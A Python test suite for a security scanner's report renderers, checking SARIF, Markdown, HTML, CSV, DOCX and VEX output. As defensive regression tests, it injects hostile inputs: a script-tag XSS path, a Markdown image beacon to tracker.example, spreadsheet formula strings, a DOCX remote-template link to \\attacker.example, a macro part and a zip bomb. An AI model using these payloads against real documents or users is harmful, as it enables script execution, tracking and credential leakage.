import base64
import copy
import csv
import hashlib
import io
import json
import re
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock

from crab_risk_scan import reports
from crab_risk_scan.reports import summary

ROOT = Path(__file__).resolve().parents[1]
FIXTURE = ROOT / "tests" / "fixtures" / "report-v3.json"
GENERATED_AT = "2026-11-20T12:30:00Z"


def load():
    return json.loads(FIXTURE.read_text(encoding="utf-8"))


def by_rule(report, rule):
    return next(f for f in report["findings"] if f["rule"] == rule)


class RenderAllFormatsTests(unittest.TestCase):
    def test_every_format_renders_the_fixture_deterministically(self):
        report = load()
        for fmt in reports.FORMATS:
            templates = ("technical", "executive") if fmt in reports.TEMPLATE_FORMATS else (None,)
            for template in templates:
                with self.subTest(fmt=fmt, template=template):
                    first = reports.render(report, fmt, template=template, generated_at=GENERATED_AT)
                    second = reports.render(copy.deepcopy(report), fmt, template=template,
                                            generated_at=GENERATED_AT)
                    self.assertTrue(first)
                    self.assertEqual(first, second)
                    self.assertEqual(reports.render(report, fmt, template=template),
                                     reports.render(report, fmt, template=template))
                    if fmt in ("json", "sarif", "codequality", "vex"):
                        json.loads(first)

    def test_generated_at_appears_only_when_given(self):
        report = load()
        self.assertNotIn("2026-11-20T12:30", reports.render(report, "markdown").decode())
        self.assertIn("2026-11-20T12:30", reports.render(report, "markdown", generated_at=GENERATED_AT).decode())
        self.assertNotIn("timestamp", json.loads(reports.render(report, "vex"))["metadata"])
        self.assertEqual(json.loads(reports.render(report, "vex", generated_at=GENERATED_AT))["metadata"]
                         ["timestamp"], GENERATED_AT)

    def test_format_for_path_rules(self):
        cases = {
            "sbom.cdx.json": "sbom:cyclonedx-json", "sbom.spdx.json": "sbom:spdx-json",
            "out.vex.json": "vex", "out.codequality.json": "codequality",
            "gl-code-quality-report.json": "codequality", "report.sarif": "sarif",
            "report.sarif.json": "sarif", "REPORT.JSON": "json", "report.md": "markdown",
            "report.markdown": "markdown", "report.html": "html", "report.htm": "html",
            "report.csv": "csv", "report.docx": "docx",
        }
        for name, expected in cases.items():
            with self.subTest(name=name):
                self.assertEqual(reports.format_for_path(Path("out") / name), expected)
        with self.assertRaises(ValueError):
            reports.format_for_path("report.txt")
        self.assertEqual(reports.sbom_formats_for(["a.spdx.json", "b.cdx.json", "c.json", "d.cdx.json"]),
                         ["cyclonedx-json", "spdx-json"])

    def test_template_combinations(self):
        report = load()
        with self.assertRaises(ValueError):
            reports.render(report, "markdown", template="custom.docx")
        with self.assertRaises(ValueError):
            reports.render(report, "csv", template="executive")
        with self.assertRaises(ValueError):
            reports.render(report, "html", template="glossy")
        with self.assertRaises(ValueError):
            reports.render(report, "pdf")
        reports.render(report, "json", template="technical")

    def test_write_outputs_applies_templates_per_format(self):
        report = load()
        with tempfile.TemporaryDirectory() as folder:
            names = ["report.json", "report.md", "report.html", "report.csv", "gl-code-quality-report.json",
                     "report.vex.json", "report.sarif", "report.docx", "sbom.cdx.json"]
            paths = [Path(folder) / name for name in names]
            written = reports.write_outputs(report, paths, sboms={"cyclonedx-json": {"bomFormat": "CycloneDX"}},
                                            template="executive", generated_at=GENERATED_AT)
            self.assertEqual(written, paths)
            self.assertEqual(json.loads(paths[0].read_text(encoding="utf-8")), report)
            self.assertIn("# Security summary", paths[1].read_text(encoding="utf-8"))
            self.assertEqual(sorted(p.name for p in Path(folder).iterdir()), sorted(names))
            with self.assertRaises(ValueError):
                reports.write_outputs(report, [Path(folder) / "x.spdx.json"], sboms={})


class SarifTests(unittest.TestCase):
    def setUp(self):
        self.report = load()
        self.sarif = json.loads(reports.render(self.report, "sarif"))
        self.run = self.sarif["runs"][0]

    def test_rules_resolve_with_security_metadata(self):
        driver = self.run["tool"]["driver"]
        self.assertEqual(driver["version"], "0.3.0")
        self.assertEqual(driver["semanticVersion"], "0.3.0")
        rules = driver["rules"]
        self.assertEqual(len({rule["id"] for rule in rules}), len(rules))
        for result in self.run["results"]:
            rule = rules[result["ruleIndex"]]
            self.assertEqual(rule["id"], result["ruleId"])
        for rule in rules:
            self.assertIn("security", rule["properties"]["tags"])
            self.assertTrue(rule["helpUri"].startswith("https://"))
            self.assertTrue(rule["name"])
            self.assertTrue(rule["shortDescription"]["text"])
            score = float(rule["properties"]["security-severity"])
            self.assertTrue(0.0 < score <= 10.0)
        rule = next(r for r in rules if r["id"] == "trivy/CVE-2099-0001")
        self.assertEqual(rule["properties"]["security-severity"], "9.8")
        self.assertIn("sca", rule["properties"]["tags"])
        self.assertIn("external/cwe/cwe-79", rule["properties"]["tags"])
        self.assertIn("cwe-79", rule["properties"]["tags"])
        self.assertIn("cve-2099-0001", rule["properties"]["tags"])
        self.assertLessEqual(max(len(r["properties"]["tags"]) for r in rules), 10)
        self.assertEqual(rule["defaultConfiguration"]["level"], "error")
        self.assertEqual(next(r for r in rules if r["id"] == "osv/MAL-2026-1234")["helpUri"],
                         "https://osv.dev/vulnerability/MAL-2026-1234")

    def test_levels_regions_and_properties(self):
        expected = {"critical": "error", "high": "error", "medium": "warning", "unknown": "warning",
                    "low": "note", "info": "note"}
        for finding, result in zip(self.report["findings"], self.run["results"]):
            self.assertEqual(result["level"], expected[finding["severity"]])
            self.assertEqual(result["partialFingerprints"], {"crab/v2": finding["fingerprint"]})
            location = result["locations"][0]["physicalLocation"]
            self.assertGreaterEqual(location["region"]["startLine"], 1)
            self.assertEqual(result["properties"]["category"], finding["category"])
        secret = self.run["results"][0]
        self.assertEqual(secret["level"], "error")
        self.assertEqual(secret["locations"][0]["physicalLocation"]["region"],
                         {"startLine": 3, "endLine": 3, "startColumn": 12, "endColumn": 32})
        cve = self.run["results"][1]["properties"]
        self.assertEqual((cve["kev"], cve["epss"], cve["cvss"], cve["fixedVersion"], cve["new"], cve["riskType"]),
                         (True, 0.9731, 9.8, "1.0.1", True, "vulnerability"))
        self.assertEqual(cve["package"], "pkg:npm/widget@1.0.0")

    def test_image_findings_use_synthetic_locations(self):
        result = next(r for r in self.run["results"] if r["ruleId"] == "trivy/CVE-2099-0002")
        location = result["locations"][0]
        self.assertEqual(location["physicalLocation"]["artifactLocation"]["uri"],
                         "crab-image/sha256-" + "a" * 64 + "/debian/openssl/3.0.11-1")
        self.assertTrue(result["properties"]["syntheticLocation"])
        self.assertIn("pkg:deb/debian/openssl", location["logicalLocations"][0]["fullyQualifiedName"])
        license_result = next(r for r in self.run["results"] if r["ruleId"] == "crab/CRAB-LIC-001")
        self.assertEqual(license_result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"],
                         "crab-inventory/npm/agpl-lib/2.0.0")

    def test_suppressions_provenance_and_invocations(self):
        suppressed = [r for r in self.run["results"] if "suppressions" in r]
        self.assertEqual(len(suppressed), 2)
        statuses = {r["ruleId"]: r["suppressions"][0] for r in suppressed}
        not_affected = statuses["crab/CRAB-CTR-001"]
        self.assertEqual(not_affected["kind"], "external")
        self.assertEqual(not_affected["properties"]["exceptionStatus"], "not_affected")
        self.assertEqual(not_affected["justification"], "The orchestrator enforces runAsNonRoot.")
        self.assertEqual(statuses["shellcheck/SC2086"]["properties"]["exceptionStatus"], "accepted")
        self.assertEqual(self.run["versionControlProvenance"],
                         [{"repositoryUri": "https://github.com/example/demo-service", "revisionId": "4f1c2e9",
                           "branch": "main"}])
        self.assertEqual(self.run["automationDetails"]["id"], "crab-risk-scan/")
        self.assertTrue(self.run["invocations"][0]["executionSuccessful"])

        report = load()
        report["revision"] = None
        report["errors"] = [{"reason": "invalid_report", "producer": "bandit", "input": 1}]
        run = json.loads(reports.render(report, "sarif"))["runs"][0]
        self.assertNotIn("versionControlProvenance", run)
        invocation = run["invocations"][0]
        self.assertFalse(invocation["executionSuccessful"])
        self.assertEqual(invocation["toolExecutionNotifications"][0]["level"], "error")
        self.assertIn("invalid_report", invocation["toolExecutionNotifications"][0]["message"]["text"])


class MarkdownTests(unittest.TestCase):
    def test_untrusted_strings_are_escaped(self):
        report = load()
        finding = by_rule(report, "G204")
        finding["path"] = "cmd/a|b`c`<img src=x>\nnext.go"
        text = reports.render(report, "markdown").decode("utf-8")
        self.assertIn("cmd/a\\|b\\`c\\`&lt;img src=x&gt; next.go", text)
        self.assertNotIn("a|b", text)
        self.assertNotIn("`c`", text)
        self.assertNotIn("<img", text)
        row = next(line for line in text.splitlines() if "cmd/a" in line and line.startswith("| High | [gosec"))
        unescaped = re.findall(r"(?<!\\)\|", row)
        self.assertEqual(len(unescaped), 10)

    def test_help_links_cannot_inject_markdown(self):
        # Regression (security review F3): help_uri comes from imported reports and was placed in
        # Markdown links unencoded, allowing image beacons and table-cell spoofing.
        report = load()
        finding = by_rule(report, "G204")
        finding["help_uri"] = 'https://a.example/x)![t](https://tracker.example/p.png|cell"title\'`'
        text = reports.render(report, "markdown").decode("utf-8")
        self.assertNotIn("![t]", text)
        self.assertNotIn("](https://tracker.example", text)
        row = next(line for line in text.splitlines() if line.startswith("| High | [gosec"))
        self.assertEqual(len(re.findall(r"(?<!\\)\|", row)), 10)
        self.assertIn("https://a.example/x%29!%5Bt%5D%28https://tracker.example/p.png%7Ccell%22title%27%60", row)
        rules = json.loads(reports.render(report, "sarif"))["runs"][0]["tool"]["driver"]["rules"]
        markdown = next(r for r in rules if r["id"] == "gosec/G204")["help"]["markdown"]
        self.assertEqual(markdown.count("]("), 1)
        self.assertNotIn("![", markdown)
        self.assertNotIn("|", markdown)

    def test_sections_and_executive_variant(self):
        report = load()
        text = reports.render(report, "markdown").decode("utf-8")
        for heading in ("## Summary", "## Coverage", "## Comparison", "## Prioritized findings",
                        "## Findings by category", "## Exceptions", "## Expired and stale exceptions",
                        "## Errors", "## Inventory and licenses", "> [!CAUTION]"):
            self.assertIn(heading, text)
        executive = reports.render(report, "markdown", template="executive").decode("utf-8")
        for heading in ("## Posture", "## Key metrics", "## Top risks", "## Recommendations"):
            self.assertIn(heading, executive)
        self.assertNotIn("## Findings by category", executive)


class HtmlTests(unittest.TestCase):
    def test_script_path_is_escaped_and_csp_hash_matches(self):
        report = load()
        hostile = "src/</script><script>alert(1)</script>.py"
        by_rule(report, "B323")["path"] = hostile
        page = reports.render(report, "html").decode("utf-8")
        self.assertNotIn("<script>alert", page)
        self.assertNotIn("</script><script>", page)
        self.assertNotIn("innerHTML", page)
        data = re.search(r'<script type="application/json" id="crab-data">(.*?)</script>', page, re.S).group(1)
        self.assertIn("\\u003c/script\\u003e", data)
        self.assertIn(hostile, json.loads(data)["findings"][7]["location"])
        scripts = re.findall(r"<script>(.*?)</script>", page, re.S)
        self.assertEqual(len(scripts), 1)
        digest = base64.b64encode(hashlib.sha256(scripts[0].encode("utf-8")).digest()).decode()
        csp = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]+)">', page).group(1)
        self.assertIn(f"script-src 'sha256-{digest}'", csp)
        self.assertIn("default-src 'none'", csp)
        style = re.search(r"<style>(.*?)</style>", page, re.S).group(1)
        style_digest = base64.b64encode(hashlib.sha256(style.encode("utf-8")).digest()).decode()
        self.assertIn(f"style-src 'sha256-{style_digest}'", csp)
        self.assertIn("@media print", style)
        self.assertIn("prefers-color-scheme:dark", style)

    def test_executive_variant(self):
        page = reports.render(load(), "html", template="executive").decode("utf-8")
        data = json.loads(re.search(r'id="crab-data">(.*?)</script>', page, re.S).group(1))
        self.assertEqual(data["variant"], "executive")
        self.assertEqual(data["posture"]["rating"], "critical")


class CsvTests(unittest.TestCase):
    def test_formula_injection_guard(self):
        report = load()
        finding = by_rule(report, "G204")
        finding["rule"] = "=HYPERLINK(\"http://x\")"
        finding["path"] = "+cmd.go"
        by_rule(report, "CVE-2099-0001")["package"]["name"] = "@SUM(A1)"
        rows = list(csv.DictReader(io.StringIO(reports.render(report, "csv").decode("utf-8"))))
        self.assertEqual(len(rows), len(report["findings"]))
        self.assertEqual(list(rows[0]), list(reports.csv_report.COLUMNS))
        hostile = next(r for r in rows if r["fingerprint"] == finding["fingerprint"])
        self.assertEqual(hostile["rule"], "'=HYPERLINK(\"http://x\")")
        self.assertEqual(hostile["path"], "'+cmd.go")
        self.assertEqual(hostile["title"], "gosec/=HYPERLINK(\"http://x\")")
        for value in ("-2+3", "\tcmd", "\rcmd"):
            self.assertEqual(reports.csv_report.guard(value), "'" + value)
        self.assertEqual(reports.csv_report.guard(-1.5), -1.5)
        package_row = next(r for r in rows if r["rule"] == "CVE-2099-0001")
        self.assertEqual(package_row["package"], "'@SUM(A1)")
        self.assertEqual((package_row["cvss"], package_row["kev"], package_row["new"]), ("9.8", "true", "true"))
        suppressed = next(r for r in rows if r["rule"] == "SC2086")
        self.assertEqual((suppressed["status"], suppressed["exception_status"]), ("suppressed", "accepted"))


class DocxTests(unittest.TestCase):
    def setUp(self):
        import docx
        self.docx = docx

    def text_of(self, document):
        parts = [p.text for p in document.paragraphs]
        for table in document.tables:
            for row in table.rows:
                parts.extend(cell.text for cell in row.cells)
        return "\n".join(parts)

    def test_builtin_templates_open(self):
        report = load()
        for template, heading in (("technical", "Detailed findings"), ("executive", "Key metrics")):
            with self.subTest(template=template):
                data = reports.render(report, "docx", template=template, generated_at=GENERATED_AT)
                document = self.docx.Document(io.BytesIO(data))
                text = self.text_of(document)
                self.assertIn(heading, text)
                self.assertIn("demo-service", text)
                self.assertEqual(document.core_properties.created.isoformat()[:19], "2026-11-20T12:30:00")
                self.assertEqual(document.core_properties.modified.isoformat()[:19], "2026-11-20T12:30:00")
                with zipfile.ZipFile(io.BytesIO(data)) as archive:
                    self.assertEqual({info.date_time for info in archive.infolist()}, {(2026, 11, 20, 12, 30, 0)})
        technical = self.text_of(self.docx.Document(io.BytesIO(reports.render(report, "docx"))))
        for section in ("Executive summary", "Scope and coverage", "Policy", "Findings by severity",
                        "Exceptions", "Appendix: methodology"):
            self.assertIn(section, technical)

    def make_template(self, folder, marker=True):
        document = self.docx.Document()
        document.add_paragraph("Report for {{TARGET}} at {{REVISION}}")
        split = document.add_paragraph()
        split.add_run("Branch {{BRA")
        split.add_run("NCH}} on {{DATE}}")
        document.add_paragraph("Before")
        if marker:
            document.add_paragraph("{{CRAB_REPORT}}")
        document.add_paragraph("After")
        table = document.add_table(rows=1, cols=1)
        table.rows[0].cells[0].text = "Tool {{TOOL_VERSION}}"
        section = document.sections[0]
        section.header.paragraphs[0].text = "Header {{TARGET}}"
        section.footer.paragraphs[0].text = "Footer {{TOOL_VERSION}}"
        path = Path(folder) / "brand.docx"
        document.save(path)
        return path

    def test_custom_template_placeholders_and_marker(self):
        report = load()
        by_rule(report, "G204")["path"] = "{{TARGET}}.go"
        with tempfile.TemporaryDirectory() as folder:
            path = self.make_template(folder)
            data = reports.render(report, "docx", template=str(path), generated_at=GENERATED_AT)
            self.assertEqual(data, reports.render(report, "docx", template=path, generated_at=GENERATED_AT))
            document = self.docx.Document(io.BytesIO(data))
            paragraphs = [p.text for p in document.paragraphs]
            self.assertEqual(paragraphs[0], "Report for demo-service at 4f1c2e9")
            self.assertEqual(paragraphs[1], "Branch main on 2026-11-20")
            self.assertNotIn("{{CRAB_REPORT}}", paragraphs)
            self.assertLess(paragraphs.index("Before"), paragraphs.index("Executive summary"))
            self.assertLess(paragraphs.index("Executive summary"), paragraphs.index("After"))
            self.assertIn("Tool 0.3.0", self.text_of(document))
            self.assertIn("{{TARGET}}.go", self.text_of(document))
            section = document.sections[0]
            self.assertEqual(section.header.paragraphs[0].text, "Header demo-service")
            self.assertEqual(section.footer.paragraphs[0].text, "Footer 0.3.0")

            path = self.make_template(folder, marker=False)
            document = self.docx.Document(io.BytesIO(reports.render(report, "docx", template=path)))
            paragraphs = [p.text for p in document.paragraphs]
            self.assertLess(paragraphs.index("After"), paragraphs.index("Executive summary"))

    def test_invalid_template_and_missing_extra(self):
        report = load()
        with tempfile.TemporaryDirectory() as folder:
            bogus = Path(folder) / "bogus.docx"
            bogus.write_bytes(b"not a zip")
            with self.assertRaises(ValueError):
                reports.render(report, "docx", template=bogus)
            with self.assertRaises(ValueError):
                reports.render(report, "docx", template=Path(folder) / "missing.docx")
        with mock.patch.dict(sys.modules, {"docx": None}):
            with self.assertRaisesRegex(ValueError, r"crab-risk-scan\[docx\]"):
                reports.render(report, "docx")

    def rewrite(self, source, target, *, add=None, replace=None):
        """Copy a DOCX, optionally adding parts or rewriting one part's bytes."""
        with zipfile.ZipFile(source) as archive, zipfile.ZipFile(target, "w", zipfile.ZIP_DEFLATED) as out:
            for info in archive.infolist():
                data = archive.read(info)
                if replace and info.filename == replace[0]:
                    data = replace[1](data)
                out.writestr(info.filename, data)
            for name, data in (add or {}).items():
                out.writestr(name, data)
        return target

    def test_template_safety_checks(self):
        # Regression (security review F6): custom templates were loaded without an expansion limit
        # and external parts (remote templates, images, UNC targets) were copied into reports.
        report = load()
        with tempfile.TemporaryDirectory() as folder:
            base = self.make_template(folder)
            rels = "word/_rels/document.xml.rels"
            external = (b'<Relationship Id="rIdX" TargetMode="External" Target="\\\\attacker.example\\t.dotm" '
                        b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"/>')
            hyperlink = (b'<Relationship Id="rIdY" Target="https://example.com/" TargetMode="External" '
                         b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"/>')
            remote = self.rewrite(base, Path(folder) / "remote.docx",
                                  replace=(rels, lambda data: data.replace(b"</Relationships>",
                                                                           external + b"</Relationships>")))
            with self.assertRaisesRegex(ValueError, "external content"):
                reports.render(report, "docx", template=remote)
            linked = self.rewrite(base, Path(folder) / "linked.docx",
                                  replace=(rels, lambda data: data.replace(b"</Relationships>",
                                                                           hyperlink + b"</Relationships>")))
            self.docx.Document(io.BytesIO(reports.render(report, "docx", template=linked)))
            macro = self.rewrite(base, Path(folder) / "macro.docx", add={"word/vbaProject.bin": b"\0" * 16})
            with self.assertRaisesRegex(ValueError, "macros"):
                reports.render(report, "docx", template=macro)
            bomb = self.rewrite(base, Path(folder) / "bomb.docx", add={"word/media/filler.bin": b"\0" * (3 << 20)})
            with mock.patch("crab_risk_scan.reports.docx_report.TEMPLATE_EXPANDED_LIMIT", 2 << 20):
                with self.assertRaisesRegex(ValueError, "expands beyond"):
                    reports.render(report, "docx", template=bomb)


class CodeQualityTests(unittest.TestCase):
    def test_shape_and_selection(self):
        report = load()
        issues = json.loads(reports.render(report, "codequality"))
        self.assertIsInstance(issues, list)
        expected = [f for f in report["findings"] if not f["suppressed"] and summary.checkout_path(f)]
        self.assertEqual([i["fingerprint"] for i in issues], [f["fingerprint"] for f in expected])
        for issue in issues:
            self.assertEqual(set(issue) >= {"description", "check_name", "fingerprint", "severity", "location"}, True)
            self.assertIn(issue["severity"], {"info", "minor", "major", "critical", "blocker"})
            self.assertGreaterEqual(issue["location"]["lines"]["begin"], 1)
        severities = {i["check_name"]: i["severity"] for i in issues}
        self.assertEqual(severities["gitleaks/aws-access-token"], "blocker")
        self.assertEqual(severities["gosec/G204"], "critical")
        self.assertEqual(severities["bandit/B323"], "major")
        self.assertEqual(severities["checkov/CKV_AWS_24"], "major")
        self.assertNotIn("trivy/CVE-2099-0002", severities)
        self.assertNotIn("shellcheck/SC2086", severities)
        self.assertNotIn("crab/CRAB-LIC-001", severities)


class VexTests(unittest.TestCase):
    def test_states_ratings_and_affects(self):
        report = load()
        widget = by_rule(report, "CVE-2099-0001")
        widget.update(suppressed=True, exception={"status": "accepted", "reason": "Compensating control",
                                                  "reviewer": "security-team"})
        evil = by_rule(report, "MAL-2026-1234")
        evil.update(suppressed=True, exception={"status": "false_positive", "reason": "Name clash",
                                                "reviewer": "dev-lead"})
        openssl = by_rule(report, "CVE-2099-0002")
        openssl.update(suppressed=True, exception={"status": "not_affected", "justification": "code_not_reachable",
                                                   "reason": "Feature disabled", "reviewer": "platform-team"})
        document = json.loads(reports.render(report, "vex"))
        self.assertEqual((document["bomFormat"], document["specVersion"], document["version"]),
                         ("CycloneDX", "1.6", 1))
        self.assertRegex(document["serialNumber"], r"^urn:uuid:[0-9a-f-]{36}$")
        refs = {component["bom-ref"] for component in document["components"]}
        vulnerabilities = {v["id"]: v for v in document["vulnerabilities"]}
        self.assertEqual(set(vulnerabilities), {"CVE-2099-0001", "MAL-2026-1234", "CVE-2099-0002"})
        for vulnerability in vulnerabilities.values():
            for affected in vulnerability["affects"]:
                self.assertIn(affected["ref"], refs)
        accepted = vulnerabilities["CVE-2099-0001"]
        self.assertEqual(accepted["analysis"], {"state": "exploitable", "response": ["will_not_fix"],
                                                "detail": "Compensating control"})
        self.assertEqual(accepted["ratings"][0], {"score": 9.8, "severity": "critical", "method": "CVSSv31",
                                                  "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                                  "source": {"name": "nvd"}})
        self.assertEqual(accepted["cwes"], [79])
        self.assertEqual(accepted["affects"][0]["ref"], "pkg:npm/widget@1.0.0")
        self.assertEqual(vulnerabilities["MAL-2026-1234"]["analysis"]["state"], "false_positive")
        not_affected = vulnerabilities["CVE-2099-0002"]["analysis"]
        self.assertEqual((not_affected["state"], not_affected["justification"]),
                         ("not_affected", "code_not_reachable"))

        triage = json.loads(reports.render(load(), "vex"))
        self.assertEqual({v["analysis"]["state"] for v in triage["vulnerabilities"]}, {"in_triage"})
        self.assertNotEqual(triage["serialNumber"], document["serialNumber"])
        self.assertEqual(triage["serialNumber"], json.loads(reports.render(load(), "vex"))["serialNumber"])


class SummaryTests(unittest.TestCase):
    def test_counts_policy_and_ordering(self):
        report = load()
        model = summary.build(report)
        self.assertEqual(model["counts"]["severity"],
                         {"critical": 3, "high": 3, "medium": 3, "low": 0, "info": 0, "unknown": 1})
        self.assertEqual(model["counts"]["suppressed"], 2)
        self.assertEqual(model["policy"]["status"], "failed")
        self.assertEqual([f["rule"] for f in model["top"][:3]], ["CVE-2099-0001", "MAL-2026-1234",
                                                                 "aws-access-token"])
        self.assertEqual(model["posture"]["rating"], "critical")
        self.assertFalse(model["posture"]["coverage_complete"])
        report["errors"] = [{"reason": "timeout"}]
        self.assertEqual(summary.policy_status(report), "incomplete")
        for finding in report["findings"]:
            finding["suppressed"] = True
        self.assertEqual(summary.posture(report)["rating"], "minimal")

    def test_engine_skipped_as_not_applicable_is_not_a_coverage_gap(self):
        report = load()
        report["imports"] = [dict(entry, status="complete") for entry in report["imports"]]
        report["imports"][-1].update(status="skipped", reason="not_applicable")
        self.assertTrue(summary.posture(report)["coverage_complete"])
        self.assertNotIn("coverage", [action["topic"] for action in summary.recommendations(report)])
        report["imports"][-1]["reason"] = "not_installed"
        self.assertFalse(summary.posture(report)["coverage_complete"])
        self.assertIn("coverage", [action["topic"] for action in summary.recommendations(report)])


if __name__ == "__main__":
    unittest.main()
